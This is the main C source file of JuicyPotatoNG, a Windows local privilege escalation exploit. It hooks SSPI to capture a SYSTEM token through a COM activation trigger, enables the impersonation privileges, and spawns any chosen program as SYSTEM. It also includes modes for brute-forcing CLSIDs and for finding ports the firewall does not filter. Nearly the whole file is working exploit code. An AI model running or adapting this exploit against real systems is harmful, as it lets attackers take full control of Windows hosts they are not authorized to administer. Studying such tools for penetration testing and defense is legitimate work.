#include "Windows.h"
#include "stdio.h"
#include "strsafe.h"
#include "netfw.h"
#include "PotatoTrigger.h"
#include "SSPIHooks.h"
#include "BruteforceCLSIDs.h"

HANDLE g_hEventTokenStolen;
HANDLE g_hEventAuthTriggered;
HANDLE g_hTokenStolenPrimary;
HANDLE g_hTokenStolenSecondary;
BOOL g_SystemTokenStolen;

void usage();
void ImpersonateInteractiveSid();
BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode);
void SeekNonFilteredPorts();

int wmain(int argc, wchar_t** argv)
{
	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
	WCHAR defaultComPort[] = L"10247";
	PWCHAR clsidStr = defaultClsidStr;
	PWCHAR comPort = defaultComPort;
	PWCHAR appname = NULL;
	PWCHAR cmdline = NULL;
	PWCHAR processtype = NULL;
	BOOL interactiveMode = FALSE;
	BOOL bruteforceClsids = FALSE;
	BOOL testingClsid = FALSE;
	BOOL seekComPort = FALSE;

	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{

		case 't':
			++cnt;
			--argc;
			processtype = argv[cnt];
			break;

		case 'p':
			++cnt;
			--argc;
			appname = argv[cnt];
			break;

		case 'a':
			++cnt;
			--argc;
			cmdline = argv[cnt];
			break;

		case 'c':
			++cnt;
			--argc;
			clsidStr = argv[cnt];
			break;

		case 'l':
			++cnt;
			--argc;
			comPort = argv[cnt];
			break;
		
		case 'i':
			interactiveMode = TRUE;
			break;

		case 'b':
			bruteforceClsids = TRUE;
			break;

		case 'z':
			testingClsid = TRUE;
			break;

		case 's':
			seekComPort = TRUE;
			break;
		
		case 'h':
			usage();
			exit(0);


		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}

	if (!testingClsid) {
		printf("\n\n\t JuicyPotatoNG\n");
		printf("\t by decoder_it & splinter_code\n\n");
	}

	if (bruteforceClsids) {
		BruteforceAllClisds();
		return 0;
	}

	if (seekComPort) {
		SeekNonFilteredPorts();
		return 0;
	}

	if (!testingClsid && (processtype == NULL || appname == NULL))
	{
		usage();
		exit(-1);
	}

	if (!testingClsid) 
		printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
	g_hEventAuthTriggered = CreateEvent(NULL, TRUE, FALSE, NULL);
	g_hEventTokenStolen = CreateEvent(NULL, TRUE, FALSE, NULL);
	g_SystemTokenStolen = FALSE;
	HookSSPIForTokenStealing(clsidStr);
	ImpersonateInteractiveSid();
	PotatoTrigger(clsidStr, comPort, g_hEventAuthTriggered);
	RevertToSelf();
	
	if (!testingClsid) {
		if (WaitForSingleObject(g_hEventAuthTriggered, 3000) == WAIT_TIMEOUT) {
			printf("[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. \n");
		}
		else {
			if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
				printf("[-] Cannot capture a valid SYSTEM token, exiting... \n");
			}
			else {
				if (g_SystemTokenStolen && Juicy(processtype, appname, cmdline, interactiveMode))
					printf("[+] Exploit successful! \n");
				else
					printf("[-] Exploit failed! \n");
			}
		}
	}
	else {
		WaitForSingleObject(g_hEventAuthTriggered, 500);
		WaitForSingleObject(g_hEventTokenStolen, 500);
	}
	
	CloseHandle(g_hEventAuthTriggered);
	CloseHandle(g_hEventTokenStolen);
	CloseHandle(g_hTokenStolenPrimary);
	CloseHandle(g_hTokenStolenSecondary);
	return 0;
}

void ImpersonateInteractiveSid() {
	HANDLE hToken;
	if (!LogonUser(L"JuicyPotatoNG", L".", L"JuicyPotatoNG", LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
		printf("[!] LogonUser failed with error code %d \n", GetLastError());
		exit(-1);
	}
	ImpersonateLoggedOnUser(hToken);
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	PRIVILEGE_SET privs;
	BOOL privEnabled;
	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("LookupPrivilegeValue() failed, error %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() failed, error %u\n", GetLastError());
		return FALSE;
	}
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!PrivilegeCheck(hToken, &privs, &privEnabled)) {
		printf("PrivilegeCheck() failed, error %u\n", GetLastError());
		return FALSE;
	}
	if (!privEnabled)
		return FALSE;
	return TRUE;
}

int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode) {
	wchar_t* command = NULL;
	wchar_t desktopName[] = L"Winsta0\\default";
	DWORD maxCmdlineLen = 30000;
	int ret = 0;
	BOOL result = FALSE, isImpersonating = FALSE;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	HANDLE hTokenCurrProc;
	DWORD dwCreationFlags = 0;
	DWORD sessionId = 0;

	// This exploit works when you have either SeImpersonate or SeAssignPrimaryToken privileges
	// We perform some token adjustments to succeed in both cases
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrProc);
	if (EnablePriv(hTokenCurrProc, SE_IMPERSONATE_NAME)) {
		EnablePriv(g_hTokenStolenSecondary, SE_IMPERSONATE_NAME);
		EnablePriv(g_hTokenStolenSecondary, SE_ASSIGNPRIMARYTOKEN_NAME);
		EnablePriv(g_hTokenStolenSecondary, SE_TCB_NAME);
		ImpersonateLoggedOnUser(g_hTokenStolenSecondary);
		isImpersonating = TRUE;
	}
	else {
		if (!EnablePriv(hTokenCurrProc, SE_ASSIGNPRIMARYTOKEN_NAME)) {
			printf("[!] Current process doesn't have SeImpersonate or SeAssignPrimaryToken privileges, exiting... \n");
			exit(-1);
		}
	}
	CloseHandle(hTokenCurrProc);

	if (cmdline != NULL)
	{
		command = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxCmdlineLen * sizeof(WCHAR));
		StringCchCopy(command, maxCmdlineLen, appname);
		StringCchCat(command, maxCmdlineLen, L" ");
		StringCchCat(command, maxCmdlineLen, cmdline);
	}

	if (*processtype == L'u' || *processtype == L'*')
	{
		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = desktopName;
		dwCreationFlags = interactiveMode ? 0 : CREATE_NEW_CONSOLE;
		if (!interactiveMode) {
			ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
			SetTokenInformation(g_hTokenStolenPrimary, TokenSessionId, &sessionId, sizeof(sessionId));
		}
		result = CreateProcessAsUserW(g_hTokenStolenPrimary, appname, command, NULL, NULL, FALSE, dwCreationFlags, NULL, L"\\", &si, &pi);
		if (!result)
			printf("[-] CreateProcessAsUser Failed to create proc: %d\n", GetLastError());
		else {
			printf("[+] CreateProcessAsUser OK\n");
			if (interactiveMode) {
				printf("[*] Process output:\n");
				WaitForSingleObject(pi.hProcess, INFINITE);
			}
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			ret = 1;
			goto cleanup;
		}
	}

	if (*processtype == L't' || *processtype == L'*')
	{
		ZeroMemory(&si, sizeof(STARTUPINFO));
		ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFO);
		si.lpDesktop = desktopName;
		
		result = CreateProcessWithTokenW(g_hTokenStolenPrimary, 0, appname, command, 0, NULL, NULL, &si, &pi);
		if (!result)
			printf("[-] CreateProcessWithTokenW Failed to create proc: %d\n", GetLastError());
		else
		{
			printf("[+] CreateProcessWithTokenW OK\n");
			ret = 1;
			goto cleanup;
		}
	}

cleanup:
	if (isImpersonating) RevertToSelf();
	if (command != NULL) HeapFree(GetProcessHeap, 0, command);
	fflush(stdout);
	return ret;
}

void SeekNonFilteredPorts() {
	INetFwMgr* pNetFwMgr;
	INetFwPolicy* pNetFwPolicy;
	INetFwProfile* pNetFwProfile;
	VARIANT allowed, restricted;
	VARIANT_BOOL firewallEnabled;
	printf("[*] Finding suitable port not filtered by Windows Defender Firewall to be used in our local COM Server port.\n");
	CoInitialize(NULL);
	CoCreateInstance(CLSID_NetFwMgr, NULL, CLSCTX_INPROC_SERVER, IID_INetFwMgr, (LPVOID*)&pNetFwMgr);
	pNetFwMgr->get_LocalPolicy(&pNetFwPolicy);
	pNetFwPolicy->get_CurrentProfile(&pNetFwProfile);
	pNetFwProfile->get_FirewallEnabled(&firewallEnabled);
	if (!firewallEnabled) {
		printf("[*] Windows Defender Firewall not enabled. Every COM port will work.\n");
	}
	else {
		for (LONG portNumber = 20; portNumber < 65535; portNumber++) {
			pNetFwMgr->IsPortAllowed((BSTR)L"System", NET_FW_IP_VERSION_ANY, portNumber, (BSTR)L"", NET_FW_IP_PROTOCOL_TCP, &allowed, &restricted);
			if (allowed.boolVal) {
				printf("[+] Found non filtered port: %d \n", portNumber);
			}
		}
	}
	pNetFwProfile->Release();
	pNetFwPolicy->Release();
	pNetFwMgr->Release();
	pNetFwMgr->Release();
	CoUninitialize();
}


void usage()
{
	printf("\n\n\t JuicyPotatoNG\n");
	printf("\t by decoder_it & splinter_code\n\n");

	printf("\n");
	printf("Mandatory args: \n"
		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both\n"
		"-p <program>: program to launch\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-l <port>: COM server listen port (Default 10247)\n"
		"-a <argument>: command line argument to pass to program (default NULL)\n"
		"-c <CLSID>: (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
		"-i : Interactive Console (valid only with CreateProcessAsUser)\n"
	);

	printf("\n\n");
	printf("Additional modes: \n"
		"-b : Bruteforce all CLSIDs. !ALERT: USE ONLY FOR TESTING. About 1000 processes will be spawned!\n"
		"-s : Seek for a suitable COM port not filtered by Windows Defender Firewall\n"
	);

}